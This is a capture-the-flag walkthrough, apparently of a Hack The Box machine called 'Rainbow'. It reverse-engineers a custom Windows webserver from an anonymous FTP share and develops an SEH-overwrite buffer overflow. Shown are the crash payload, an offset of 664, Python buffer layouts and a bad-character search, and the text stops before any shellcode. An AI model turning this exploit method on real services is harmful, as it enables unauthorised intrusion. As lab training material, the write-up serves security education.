![[Pasted_image_20251025172750.png]]

Here we go again.

Start with an nmap scan.

```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb]
└─$ nmap -A -Pn 10.129.234.171
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-25 11:40 PDT
Nmap scan report for 10.129.234.171
Host is up (0.14s latency).
Not shown: 993 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 01-18-22  08:22AM                  258 dev.txt
| 01-18-22  08:30AM                54784 rainbow.exe
| 01-16-22  01:34PM                  479 restart.ps1
|_01-16-22  12:14PM       <DIR>          wwwroot
80/tcp   open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: RAINBOW
|   NetBIOS_Domain_Name: RAINBOW
|   NetBIOS_Computer_Name: RAINBOW
|   DNS_Domain_Name: rainbow
|   DNS_Computer_Name: rainbow
|   Product_Version: 10.0.17763
|_  System_Time: 2025-10-25T18:44:06+00:00
|_ssl-date: 2025-10-25T18:44:45+00:00; +2s from scanner time.
| ssl-cert: Subject: commonName=rainbow
| Not valid before: 2025-10-24T18:35:40
|_Not valid after:  2026-04-25T18:35:40
8080/tcp open  http-proxy
|_http-title: Dev Wiki powered by Rainbow Webserver
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Cache-Control: no-cache, private
|     Content-Type: text/html
|     X-Powered-By: Rainbow 0.1
|     Content-Length: 1478
|     <!DOCTYPE html>
|     <html lang="en" xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <meta charset="utf-8" />
|     <title>Dev Wiki powered by Rainbow Webserver</title>
|     <style> 
|     .rainbow {
|     font-size: 24pt;
|     background-image: linear-gradient(to left, violet, indigo, blue, green, yellow, orange, red); -webkit-background-clip: text;
|     color: transparent;
|     body {
|     display: flex;
|     justify-content: center;
|     align-items: center;
|     text-align: center;
|     min-height: 100vh;
|     </style>
|     </head>
|     <body>
|     <!-- 
|     Under Development, please come back later -->
|     <pre class="rainbow">
|     _.--'_......----........
|     _,i,,-'' __,,...........___
|_    ,;-' _.--'' ___,,...
|_http-open-proxy: Proxy might be redirecting requests
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.95%I=7%D=10/25%Time=68FD19C3%P=x86_64-pc-linux-gnu%r(G
SF:etRequest,646,"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x20no-cache,\x2
SF:0private\r\nContent-Type:\x20text/html\r\nX-Powered-By:\x20Rainbow\x200
SF:\.1\r\nContent-Length:\x201478\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html>\n\
SF:n<html\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/xhtml\">\n<he
SF:ad>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x20\x20\x20\x20
SF:<title>Dev\x20Wiki\x20powered\x20by\x20Rainbow\x20Webserver</title>\n\x
SF:20\x20\x20\x20<style>\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20
SF:\.rainbow\x20{\n\t\tfont-size:\x2024pt;\n\t\tbackground-image:\x20linea
SF:r-gradient\(to\x20left,\x20violet,\x20indigo,\x20blue,\x20green,\x20yel
SF:low,\x20orange,\x20red\);\x20\x20\x20-webkit-background-clip:\x20text;\
SF:n\x20\t\tcolor:\x20transparent;\n\t}\n\tbody\x20{\n\x20\x20\t\tdisplay:
SF:\x20flex;\n\x20\x20\t\tjustify-content:\x20center;\n\x20\t\t\x20align-i
SF:tems:\x20center;\n\x20\x20\t\ttext-align:\x20center;\n\x20\x20\t\tmin-h
SF:eight:\x20100vh;\n\t}\n\x20\x20\x20\x20</style>\n</head>\n<body>\n\x20\
SF:x20\x20\x20<!--\x20\xf0\x9f\x8c\x88\x20Under\x20Development,\x20please\
SF:x20come\x20back\x20later\x20-->\n\n\n\x20\x20\x20\x20\x20<pre\x20class=
SF:\"rainbow\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\.--'_\.\.\.\.\.\.-
SF:---\.\.\.\.\.\.\.\.\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_,i,,-''\x20__,,\.\.\.\.\
SF:.\.\.\.\.\.\.___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20,;-'\x20_\.--''\x20\x20\x20\x20___,,
SF:\.\.\.")%r(HTTPOptions,646,"HTTP/1\.1\x20200\x20OK\r\nCache-Control:\x2
SF:0no-cache,\x20private\r\nContent-Type:\x20text/html\r\nX-Powered-By:\x2
SF:0Rainbow\x200\.1\r\nContent-Length:\x201478\r\n\r\n\xef\xbb\xbf<!DOCTYP
SF:E\x20html>\n\n<html\x20lang=\"en\"\x20xmlns=\"http://www\.w3\.org/1999/
SF:xhtml\">\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\"\x20/>\n\x2
SF:0\x20\x20\x20<title>Dev\x20Wiki\x20powered\x20by\x20Rainbow\x20Webserve
SF:r</title>\n\x20\x20\x20\x20<style>\x20\x20\x20\x20\n\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\.rainbow\x20{\n\t\tfont-size:\x2024pt;\n\t\tbackground-im
SF:age:\x20linear-gradient\(to\x20left,\x20violet,\x20indigo,\x20blue,\x20
SF:green,\x20yellow,\x20orange,\x20red\);\x20\x20\x20-webkit-background-cl
SF:ip:\x20text;\n\x20\t\tcolor:\x20transparent;\n\t}\n\tbody\x20{\n\x20\x2
SF:0\t\tdisplay:\x20flex;\n\x20\x20\t\tjustify-content:\x20center;\n\x20\t
SF:\t\x20align-items:\x20center;\n\x20\x20\t\ttext-align:\x20center;\n\x20
SF:\x20\t\tmin-height:\x20100vh;\n\t}\n\x20\x20\x20\x20</style>\n</head>\n
SF:<body>\n\x20\x20\x20\x20<!--\x20\xf0\x9f\x8c\x88\x20Under\x20Developmen
SF:t,\x20please\x20come\x20back\x20later\x20-->\n\n\n\x20\x20\x20\x20\x20<
SF:pre\x20class=\"rainbow\">\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\.--'_
SF:\.\.\.\.\.\.----\.\.\.\.\.\.\.\.\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_,i,,-''\x20
SF:__,,\.\.\.\.\.\.\.\.\.\.\.___\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20,;-'\x20_\.--''\x20\x20
SF:\x20\x20___,,\.\.\.");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2s, deviation: 0s, median: 2s
| smb2-time: 
|   date: 2025-10-25T18:44:10
|_  start_date: N/A

TRACEROUTE (using port 21/tcp)
HOP RTT       ADDRESS
1   162.97 ms 10.10.14.1
2   163.08 ms 10.129.234.171

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 243.61 seconds

```

The machine doesn't have ports typically associated with domain controllers exposed.  But it does have FTP exposed, and its allowing anonymous login:
```sh
21/tcp   open  ftp           Microsoft ftpd
| ftp-syst: 
|_  SYST: Windows_NT
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 01-18-22  08:22AM                  258 dev.txt
| 01-18-22  08:30AM                54784 rainbow.exe
| 01-16-22  01:34PM                  479 restart.ps1
|_01-16-22  12:14PM       <DIR>          wwwroot
```

Download the files
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow]
└─$ ftp rainbow.htb
Connected to rainbow.htb.
220 Microsoft FTP Service
Name (rainbow.htb:notroot): Anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password: 
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||50101|)
125 Data connection already open; Transfer starting.
01-18-22  08:22AM                  258 dev.txt
01-18-22  08:30AM                54784 rainbow.exe
01-16-22  01:34PM                  479 restart.ps1
01-16-22  12:14PM       <DIR>          wwwroot
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *
mget dev.txt [anpqy?]? a
Prompting off for duration of mget.
229 Entering Extended Passive Mode (|||50103|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************|   258        2.51 KiB/s    00:00 ETA
226 Transfer complete.
258 bytes received in 00:00 (2.47 KiB/s)
229 Entering Extended Passive Mode (|||50104|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************| 54784      172.75 KiB/s    00:00 ETA
226 Transfer complete.
54784 bytes received in 00:00 (172.63 KiB/s)
229 Entering Extended Passive Mode (|||50105|)
125 Data connection already open; Transfer starting.
100% |***********************************************************************|   479        4.79 KiB/s    00:00 ETA
226 Transfer complete.
479 bytes received in 00:00 (4.76 KiB/s)
```

The `dev.txt` calls out a `restart script` and mentions that the application is rotated through ports `8080-8090` when the webapp crashes.
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ cat dev.txt 
* Our webserver has been crashing a lot lately. Instead of touching the code we added a restart script! 
* The server will dynamically pick a port when its default port is unresponsive (8080-8090).
* We'll fix this later by adding load balancer.

- dev team
```

The `restart.ps1` discloses that the adjacent `rainbow.exe` is found at `c:\rainbow\rainbow.exe`
```powershell
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ cat restart.ps1 
Set-Location -Path c:\rainbow
for(;;){
try{
If (!(Get-Process -Name rainbow -ErrorAction SilentlyContinue))
{Invoke-Expression "C:\rainbow\rainbow.exe" }
$proc = Get-Process -Name rainbow | Sort-Object -Property ProcessName -Unique -ErrorAction SilentlyContinue
If (!$proc -or ($proc.Responding -eq $false) –or ($proc.WorkingSet -GT 200000*1024)) {
$proc.Kill()
Start-Sleep -s 10
Invoke-Expression "C:\rainbow\rainbow.exe"}
}
catch    {    }
Start-sleep -s 30
}
```

Port 80 is a default IIS start page.
Port 8080 is the development webapp, its homepage aligns with the `index.html` found in the `wwwroot` directory in the FTP share.

![[Pasted_image_20251025174111.png]]

Anonymous access doesn't allow upload to the FTP share, so straight to webshell is off the table.


# Static Analysis

I tried analyzing the `rainbow.exe` using `AvaloniaILSpy` (https://github.com/icsharpcode/AvaloniaILSpy) but the executable isn't managed code:

![[Pasted_image_20251025174908.png]]

Examining the binary in `Ghidra`, I find that the binary has a number of imports, one of which is `ws2_32.dll`.  A good sign the binary features network connection-related operations.

![[Pasted_image_20251025182226.png]]

Following the entrypoint, a stack cookie is set up, and a single function is called, which had another name but I renamed it "main", which seems fitting in this context.

![[Pasted_image_20251025182456.png]]

Following the `main()` function, there is not much to be said about the first two -thirds of the function; likely initialization of the console.  However the near-end of the function starts a webserver, seems to get the address of a loaded module, and an ESI is returned if in good standing. All other scenarios lead to raising SEH exception.  

![[Pasted_image_20251025183355.png]]

Examining the `start_webserver()` function.

![[Pasted_image_20251025185956.png]]

The function on line 8 I named `std_cout`, because it seems like that's what its doing is directing stdout to console.

Lines 9 and 11  are setting the port range talked about in the `dev.txt`.   Well, not quite, because that said `8080-8090`, this clearly won't work for ports `8089` and `8090`. 

```
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ echo "ibase=16; obase=A; 1F90" | bc
8080

┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ echo "ibase=16; obase=A; 1F99" | bc
8089
```

Not entirely sure what the function on 14 is doing, my best guess is it is creating and storing a  `HostInfo`  struct.  The struct isn't used by the server, it's used by the client.

The function on line 15 I named `socket_bind_server` because I found it was calling a bunch of functions by ordinals, those ordinals align with `ws2_32` and I found them translate in the following order, which I commented inline in the disasm.  

```
/* https://strontic.github.io/xcyclopedia/library/ws2_32.dll-9AB0235EC0B3AAC2A9E 82C18B4677F89.html

/* WSAStartup  115  Exported Function */
/* socket  23  Exported Function */
/* WSAGetLastError  111  Exported Function */
/* htons  9  Exported Functio */
/* bind  2  Exported Function */
/* setsockopt  21  Exported Function */
/* listen  13  Exported Function */
```

The other function I named `sock_client` because I found it to be calling functions by ordinal that align with a spawned socket client:
```
/* select  18  Exported Function */
/* accept  1  Exported Function */
/* recv  16  Exported Function */
/* closesocket  3  Exported Function */
/* WSACleanup  116  Exported Function */
```

The client function will need a closer examination, because this is where there appears to be actual substance to the application.

On line 69, I see a zeroing of memory using `memset`.  This is followed by a `recv` of  0x1000 bytes, followed by a `closesocket`.  The `local_28` variable is passed to the call of `closesocket`, so it must be a socket handle for the client. Curiously, Lines 76-78 seem to iterate over the `recv`'d bytes like `(int x=0; x<len(recvd); x=x+1)` like a for-range type iterator.  However what is strange is the comparison of the indexed value to the `local_28` client sock fdescriptor.  So we seem to be avoiding a buffer overflow by checking if we reached the fdescriptor at offset +5 of the iterator.  Basically looking ahead at the dword adjacent to the iterator. 

![[Pasted_image_20251025191934.png]]

This is where things get interesting, because if we do manage to match to local_28, then a short jump to label `LAB_004019cb` occurs.  This looks like a shift left operation.  Every iteration, the byte pointed at by `local_14[local_18+5]` is reassigned the byte pointed at by `local_14[local_18+6]`.  There is no initializer in the for range loop, here we seem to be finishing off the remainder of the initial for range loop started on line 76. 

Once the shift operation has finished, the dword pointed at by `local_14[4]` is decremented by 1.  Then `local_30` is incremented by 1.   Then a short jump back up to start an `accept`,  `recv` all over again (label `LAB_00401894`).

![[Pasted_image_20251025193932.png]]

If for some reason we can get to the end of the iterator in the initial for range loop without ever matching `local_14[local_18 + 5]` to the client sock fdescriptor, we enter a whole other branch.

![[Pasted_image_20251025195814.png]]

Real quick, the three short jump labels go to 
1. increment local_30 +1 then go back to `accept`, `recv`
2. just go back to `accept`, `recv`
3. If we made it here, it is because there wasn't actually a client fdescriptor, all paths from here lead to WSACleanup (i.e., maybe lost connection).

The first function on line 87 is a slightly recursive function.  More on that in a  second.
The second function on line 89 is a check if a VirtualProcessor is available, if not then throw an error.
The third function on line 91 is also a check if a VirtualProcessor is available, if not then terminate().

So it appears that, if there is something important to do with the received buffer, as all other paths lead away from using the buffer, then it has to happen in the first function found on line 87.  Because after that between the five choices you have two functions that both terminate-equiv, two labels that get a new client recv, and a label that terminates.

Lets examine the function on line 87.

![[Pasted_image_20251025200847.png]]

I'm renaming this function `depth1`

The `_unfancy()` function just returns whatever was passed to it.  In this way passed parameters get assigned to function-local variables.

The function call on line 18 is, for lack of a better term, obnoxious:

![[Pasted_image_20251025201504.png]]

We can skip close analysis of the first four function calls.  The first one, has deep recursion and at the end of all the recursion is obtaining structs.  I can't help but feel like its setting up for calling an SEH chain.  The other three are freeing memory and returning pointers to memory.  

The function of interest is the `beginthreadex` call on line 39,  it has a function as an argument.  If the application is going to do something interesting with the `recv` buffer, now is its chance, because the function calls on lines 43, 46, and 49 are either throw an error, or do garbage collection and return.  However with the preamble that leads up to it, it is most likely what calls the SEH chain.

Well, and this is a major disappointment.

I think that's exactly what it does.

![[Pasted_image_20251025202851.png]]

The first function on line 21 creates a compressed pair (???) , an obvious C++ construct related to optimization of empty memory storage (when empty).

The other function calls occurring between lines 21 and 31 are just using an alternate form of, turn arguments into local variables.  This time, from what I can tell, the parameters are those of the parent function's, as nothing was passed to this function.

Ah, but the function on line 33 is something else entirely.

![[Pasted_image_20251025203742.png]]

That looks an awful lot like a function pointer exec, save for the three argument being passed to it.  We can see that pointer-to-param1 is being cast as a pointer-to-code-pointer, and then getting called with three arguments.

There is nothing left to analyze here at the moment.


# Dynamic analysis
Only way forward is to debug it live.  The following can help expedite managing the lifecycle of the binary and attaching windbg to it.  one of the challenges is that the application blocks while its running, and it has console output .  So it has to be started as a background process and output redirected to a file while trying to one-liner starting and attaching to it.

Additionally I have set an initial breakpoint at the instruction that calls Ordinal_16 (recv).
```sh
c:\rainbow>((cmd.exe /c "taskkill /F /IM rainbow.exe" && timeout 3 && START /B "" "c:\rainbow\rainbow.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "c:\rainbow\rainbow.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x00401971; g'
```

In `IDAPro`, that would actually be here:

![[Pasted_image_20251025221501.png]]

To cause the application to hit the breakpoint, I can start with an initial curl command, although this is just a hello world; this is about to become a PoC.
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ perl -e "printf 'A'x0x1020" | curl -X POST http://192.168.56.100:8080/index.html -d "fuzzed=$(cat -)"
```

The convention for calling `ws2_32::recv`

https://learn.microsoft.com/en-us/windows/win32/api/winsock2/nf-winsock2-recv

```c
int WSAAPI recv(
  [in]  SOCKET s,
  [out] char   *buf,
  [in]  int    len,
  [in]  int    flags
);
```

That means at the breakpoint, the first four dwords on the stack are the arguments.
```sh
Breakpoint 0 hit
eax=00000110 ebx=0022d000 ecx=00000018 edx=0019eca8 esi=0019ff24 edi=0019fdac
eip=00401971 esp=0019ec90 ebp=0019fe08 iopl=0         nv up ei pl nz ac pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000216
rainbow+0x1971:
00401971 ff15ccb14000    call    dword ptr [rainbow+0xb1cc (0040b1cc)] ds:002b:0040b1cc={WS2_32!recv (774b23a0)}

0:000> dd esp L4
0019ec90  00000110 0019eca8 00001000 00000000
```

The buffer will get received into `0019eca8`.  Stepping over the instruction, the `recv` buffer gets filled.
```sh
0:000> p
eax=00001000 ebx=0022d000 ecx=00000002 edx=0019ebf0 esi=0019ff24 edi=0019fdac
eip=00401977 esp=0019eca0 ebp=0019fe08 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
rainbow+0x1977:
00401977 8945cc          mov     dword ptr [ebp-34h],eax ss:002b:0019fdd4=00000000
0:000> db 0x0019eca8 L4096
0019eca8  50 4f 53 54 20 2f 69 6e-64 65 78 2e 68 74 6d 6c  POST /index.html
0019ecb8  20 48 54 54 50 2f 31 2e-31 0d 0a 48 6f 73 74 3a   HTTP/1.1..Host:
0019ecc8  20 31 39 32 2e 31 36 38-2e 35 36 2e 31 30 30 3a   192.168.56.100:
0019ecd8  38 30 38 30 0d 0a 55 73-65 72 2d 41 67 65 6e 74  8080..User-Agent
0019ece8  3a 20 63 75 72 6c 2f 38-2e 31 35 2e 30 0d 0a 41  : curl/8.15.0..A
0019ecf8  63 63 65 70 74 3a 20 2a-2f 2a 0d 0a 43 6f 6e 74  ccept: */*..Cont
0019ed08  65 6e 74 2d 4c 65 6e 67-74 68 3a 20 34 31 33 35  ent-Length: 4135
0019ed18  0d 0a 43 6f 6e 74 65 6e-74 2d 54 79 70 65 3a 20  ..Content-Type: 
0019ed28  61 70 70 6c 69 63 61 74-69 6f 6e 2f 78 2d 77 77  application/x-ww
0019ed38  77 2d 66 6f 72 6d 2d 75-72 6c 65 6e 63 6f 64 65  w-form-urlencode
0019ed48  64 0d 0a 0d 0a 66 75 7a-7a 65 64 3d 41 41 41 41  d....fuzzed=AAAA
0019ed58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed68  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
[...]
[...]
0019fc98  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019fca8  01 00 00 00 10 01 00 00-10 01 00 00 00 00 00 00  ................
```

As can be seen, this pass was for some 0x1000 bytes.

Passing over again, we see that the buffer was zeroed out, and the remaining 0x20 + len(http POST request minus data) bytes was received:
```sh
0:000> p
eax=000000cc ebx=0022d000 ecx=00000002 edx=0019ebf0 esi=0019ff24 edi=0019fdac
eip=00401977 esp=0019eca0 ebp=0019fe08 iopl=0         nv up ei pl zr na pe nc
cs=0023  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000246
rainbow+0x1977:
00401977 8945cc          mov     dword ptr [ebp-34h],eax 
0:000> db 0x0019eca8 L100
0019eca8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ecb8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ecc8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ecd8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ece8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ecf8  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed08  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed18  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed28  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed38  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed48  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed58  41 41 41 41 41 41 41 41-41 41 41 41 41 41 41 41  AAAAAAAAAAAAAAAA
0019ed68  41 41 41 41 41 41 41 41-41 41 41 41 00 00 00 00  AAAAAAAAAAAA....
0019ed78  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
```

The maths
```sh
┌──(notroot㉿elysium)-[(master) 1 ~/htb/machines/rainbow/dump]
└─$ echo 'ibase=16; obase=A; D64-C68' | bc
252
```

The http post request added to the request has thrown off initial assumptions.

One key discovery is that during testing, I found that the payload only makes it to the functionpointer exec if the connection is kept open.

Additionally, I found that the sent data can be max 0x1000 bytes, anything over that resets the buffer (causes it to get zeroed back out and any modulo 0x1000 is received as the buffer)

The following has two breakpoints, one at the call for recv, the other at the function call that contains the functionpointer exec.

```sh
((cmd.exe /c "taskkill /F /IM rainbow.exe" && timeout 3 && START /B "" "c:\rainbow\rainbow.exe" > c:\users\admin\desktop\current_thing\output.txt) || START /B "" "c:\rainbow\rainbow.exe" > c:\users\admin\desktop\current_thing\output.txt) && timeout 3 && "C:\Program Files (x86)\Windows Kits\10\Debuggers\x86\windbg.exe" -WF C:\windbg_custom.WEW -pn rainbow.exe -c 'bp 0x00401971; bp 0x0040232f; g'
```


# Finding a crash

I found that if I debug without any breakpoints, and if I send a POST request with 0x1000 bytes, I get a response back.
```sh
┌──(notroot㉿elysium)-[(master) 2 ~/htb/machines/rainbow]
└─$ perl -e "printf 'A'x0x1000" | curl -X POST http://192.168.56.100:8080/index.html -d "fuzzed=$(cat -)"
<html><h1>404 Not Found</h1></html>
```

If I back that off just by 0x100 bytes, I get AccessViolation.
```sh
┌──(notroot㉿elysium)-[(master) 2 ~/htb/machines/rainbow]
└─$ perl -e "printf 'A'x0x0f00" | curl -X POST http://192.168.56.100:8080/index.html -d "fuzzed=$(cat -)"
```

![[Pasted_image_20251026012334.png]]

The exception chain shows that it has been overwritten with As:
```sh
0:003> !exchain
009bfbe4: 41414141
Invalid exception stack at 41414141
```

Further, once converted to python,  I found that I can coerce this failure with a very minimal POST body, saving space and eliminating variability.

```python
buf = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
buf += ("\x41" * 0xf00)
```
^^ 3908 bytes total


# Finding the pattern

Retesting with a pattern, with the following buffer.  I'll pass the pattern string in at CLI invocation.
```python
buf = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
buf += sys.argv[2][:0xf00]
```

Called like:
```sh
┌──(notroot㉿elysium)-[(master) 2 ~/htb/machines/rainbow]
└─$ ./poc.py 192.168.56.100:8080 $(msf-pattern_create -l 0x0f00)
```

Identify the pattern found in the exception stack:
```sh
0:003> !exchain
009cfbe4: 77413177
Invalid exception stack at 41307741
```

Identify the offset
```sh
┌──(notroot㉿elysium)-[(master) 2 ~/htb/machines/rainbow]
└─$ msf-pattern_offset -l 0x0f00 -q 77413177
[*] Exact match at offset 664
```

Buffer be like
```python
	total_len = 3908
    crash_len = 664
    head = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
    sled1 = ("\x40" * crash_len)
    SEH = ("\x41" * 4)
    tail = ("\x42" * (total_len - sum([len(x) for x in [
        head,
        sled1,
        SEH
    ]])))
    buf = f"{head}{sled1}{SEH}{tail}"
```

Now I am aligned
```sh
0:003> !exchain
009dfbe4: 41414141
Invalid exception stack at 40404040
```


# Finding Badchars

Real quick though, test for badchars.  I have a function I built for that:

```python
badchars = ""
def gen_badchars(bc, start="\x01", end="\xff"):
	s_int = ord(start)
	e_int = ord(end)+1
	BC = bytearray(range(s_int,e_int)).decode('latin-1')
	for item in bc:
		BC = BC.replace(item,'')
	return BC
```

I use the above function and variable for massaging out badchars, by creating a string containing all bytes within a certain range.  I typically just start out with null to -1 as the range, but sometime I'd know beforehand about certain badchars, in this case I have no clue. 

```python
    total_len = 3908
    crash_len = 664
    head = "POST / HTTP/1.1\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0a\x0d\x0a"
    sled1 = ("\x40" * crash_len)
    SEH = ("\x41" * 4)
    bad = gen_badchars(badchars, start="\x00", end="\xff")
    tail = ("\x42" * (total_len - sum([len(x) for x in [
        head,
        sled1,
        SEH,
        bad
    ]])))
    buf = f"{head}{sled1}{SEH}{bad}{tail}"
```

Null is for sure bad. 
```sh
0:003> !exchain
009ff8e4: rainbow+a040 (0040a040)
009ff924: rainbow+a040 (0040a040)
009ffbe4: 41414141
Invalid exception stack at 40404040
0:003> db 0x009ffbe4 L0n256
009ffbe4  40 40 40 40 41 41 41 41-05 00 00 00 f0 fe 9f 00  @@@@AAAA........
009ffbf4  b3 26 40 00 28 60 6d 00-b8 60 6d 00 b8 60 6d 00  .&@.(`m..`m..`m
```

So I add `\x00` to the badchars var above the `gen_badchars` function, rinse and repeat.

This time I had to go hunting for it a little bit, alignment was thrown off.
```sh
0:003> db 0x00a0fbe4-0x2b0 L0n280
00a0f934  a3 2b 40 00 50 f9 a0 00-b8 b3 40 00 b8 8c 62 00  .+@.P.....@...b.
00a0f944  10 3d 61 00 c0 20 40 00-10 3d 61 00 0b 0c 0d 0e  .=a.. @..=a.....
00a0f954  0f 10 11 12 13 14 15 16-17 18 19 1a 1b 1c 1d 1e  ................
00a0f964  1f 20 21 22 23 24 25 26-27 28 29 2a 2b 2c 2d 2e  . !"#$%&'()*+,-.
00a0f974  2f 30 31 32 33 34 35 36-37 38 39 3a 3b 3c 3d 3e  /0123456789:;<=>
00a0f984  3f 40 41 42 43 44 45 46-47 48 49 4a 4b 4c 4d 4e  ?@ABCDEFGHIJKLMN
00a0f994  4f 50 51 52 53 54 55 56-57 58 59 5a 5b 5c 5d 5e  OPQRSTUVWXYZ[\]^
00a0f9a4  5f 60 61 62 63 64 65 66-67 68 69 6a 6b 6c 6d 6e  _`abcdefghijklmn
00a0f9b4  6f 70 71 72 73 74 75 76-77 78 79 7a 7b 7c 7d 7e  opqrstuvwxyz{|}~
00a0f9c4  7f 80 81 82 83 84 85 86-87 88 89 8a 8b 8c 8d 8e  ................
00a0f9d4  8f 90 91 92 93 94 95 96-97 98 99 9a 9b 9c 9d 9e  ................
00a0f9e4  9f a0 a1 a2 a3 a4 a5 a6-a7 a8 a9 aa ab ac ad ae  ................
00a0f9f4  af b0 b1 b2 b3 b4 b5 b6-b7 b8 b9 ba bb bc bd be  ................
00a0fa04  bf c0 c1 c2 c3 c4 c5 c6-c7 c8 c9 ca cb cc cd ce  ................
00a0fa14  cf d0 d1 d2 d3 d4 d5 d6-d7 d8 d9 da db dc dd de  ................
00a0fa24  df e0 e1 e2 e3 e4 e5 e6-e7 e8 e9 ea eb ec ed ee  ................
00a0fa34  ef f0 f1 f2 f3 f4 f5 f6-f7 f8 f9 fa fb fc fd fe  ................
00a0fa44  ff 42 42 42 42 42 42 42                          .BBBBBBB
```

